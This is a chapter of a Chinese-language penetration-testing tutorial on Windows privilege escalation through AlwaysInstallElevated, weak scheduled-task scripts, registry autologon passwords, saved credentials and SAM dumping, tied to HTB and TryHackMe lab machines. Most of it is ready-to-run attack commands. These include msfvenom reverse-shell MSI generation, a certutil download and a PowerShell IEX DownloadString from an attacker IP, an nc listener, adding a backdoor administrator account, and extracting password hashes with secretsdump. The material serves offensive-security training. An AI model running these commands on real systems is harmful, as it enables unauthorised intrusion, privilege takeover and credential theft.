# Ch 28 — AlwaysInstallElevated / 排程任務 / Registry

> 目標：掌握三個額外的 Windows 提權技術：AlwaysInstallElevated MSI 安裝、排程任務弱權限、Registry 自動登入憑證。

## AlwaysInstallElevated

### 原理

Windows Group Policy 可以設定「允許非管理員以 SYSTEM 身份安裝 MSI 套件」。如果這個設定在 HKLM 和 HKCU 都是 1，你可以安裝一個惡意 MSI 取得 SYSTEM。

### 確認是否啟用

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

兩個都要是 `0x1` 才能利用。

### 利用步驟

```bash
# 在 Kali 生成惡意 MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o evil.msi

# 傳到靶機
certutil -urlcache -f http://10.10.14.5/evil.msi C:\Windows\Temp\evil.msi

# Kali 開監聽
nc -nvlp 4444

# 靶機執行安裝
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
```

### PowerUp 自動化

```powershell
Invoke-AllChecks
# 找到 AlwaysInstallElevated 後

Write-UserAddMSI   # 用 PowerUp 直接生成
```

## 排程任務（Scheduled Tasks）

### 找可利用的排程任務

```cmd
# 列出所有排程任務
schtasks /query /fo LIST /v | findstr /i "task name\|run as\|task to run"

# 找 SYSTEM 跑的任務
schtasks /query /fo LIST /v | findstr /i "SYSTEM\|Administrator" -A 5
```

重點看：
- `Run As User: SYSTEM`（以 SYSTEM 身份跑）
- `Task To Run: C:\path\to\script.ps1`（腳本路徑）

### 找腳本的權限

```cmd
icacls "C:\path\to\script.ps1"
# 如果你能寫 → 替換內容
```

### 利用

```cmd
# 修改腳本（以惡意指令替換）
echo net user hacker P@ssword /add > C:\path\to\script.ps1
echo net localgroup administrators hacker /add >> C:\path\to\script.ps1

# 或用反彈 shell
echo powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/rev.ps1')" > C:\path\to\script.ps1

# 等排程任務執行（或手動觸發如果有權限）
schtasks /run /TN "TaskName"
```

### 找排程任務的 binary 路徑

```powershell
Get-ScheduledTask | Where-Object {$_.TaskPath -notmatch "\\Microsoft\\"} | Select TaskName, @{N="Run";E={$_.Actions.Execute}}, @{N="Arg";E={$_.Actions.Arguments}}
```

## Registry 憑證

### 自動登入憑證

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# 輸出：
# DefaultUsername    REG_SZ    Administrator
# DefaultPassword    REG_SZ    P@ssw0rd123!   ← 明文密碼！
```

拿到密碼後用 psexec 或 RDP 登入。

### 其他 Registry 密碼位置

```cmd
# 各種應用程式儲存密碼
reg query HKCU /f password /t REG_SZ /s 2>nul
reg query HKLM /f password /t REG_SZ /s 2>nul

# VNC 密碼（加密，可破解）
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password

# PuTTY 儲存的 SSH 連線
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

## RunAs / Credential Manager

```cmd
# 看儲存的憑證
cmdkey /list

# 如果有儲存的管理員憑證
runas /savecred /user:Administrator "cmd.exe"
```

## 密碼搜尋

### 設定檔和備份

```cmd
# 找 unattend.xml（Windows 安裝回應檔，可能有密碼）
dir /s /b unattend.xml 2>nul
dir /s /b sysprep.xml 2>nul
dir /s /b sysprep.inf 2>nul

# 找含密碼關鍵字的檔案
findstr /si password *.txt *.xml *.ini *.config
```

`unattend.xml` 位置：

```
C:\Windows\Panther\unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\System32\sysprep\sysprep.xml
```

### SAM 和 NTDS.dit

```cmd
# SAM（本地帳號密碼）
# 正在使用中，通常要用特殊技術讀取
reg save HKLM\SAM C:\sam
reg save HKLM\SYSTEM C:\system

# 在 Kali 提取
python3 secretsdump.py -sam sam -system system LOCAL
```

## 整合 winPEAS 找以上問題

```
winPEAS 輸出中找：
  [*] AlwaysInstallElevated → 直接可用
  [*] Scheduled tasks → 看腳本路徑和權限
  [*] Looking for AutoLogon credentials → 明文密碼
  [*] SAM and SYSTEM files → 可讀的話很危險
  [*] Unattended install files → unattend.xml 密碼
```

## 本章對應靶機

| 機器 | 技術 |
|------|-----|
| HTB Bounty | AlwaysInstallElevated |
| THM Windows Privesc Arena | 各種技術組合 |
| THM Windows PrivEsc | 包含 registry 密碼 |

## 自我檢核

- [ ] 知道 AlwaysInstallElevated 需要 HKLM 和 HKCU 都是 1
- [ ] 能用 `schtasks /query` 找排程任務的腳本路徑
- [ ] 知道 `HKLM\...\Winlogon` 的 DefaultPassword 是明文密碼
- [ ] 能用 reg save 備份 SAM 並在 Kali 提取 hash

→ [Ch 29 winPEAS / PowerUp / Seatbelt 解讀](./29-windows-enum-tools.md)
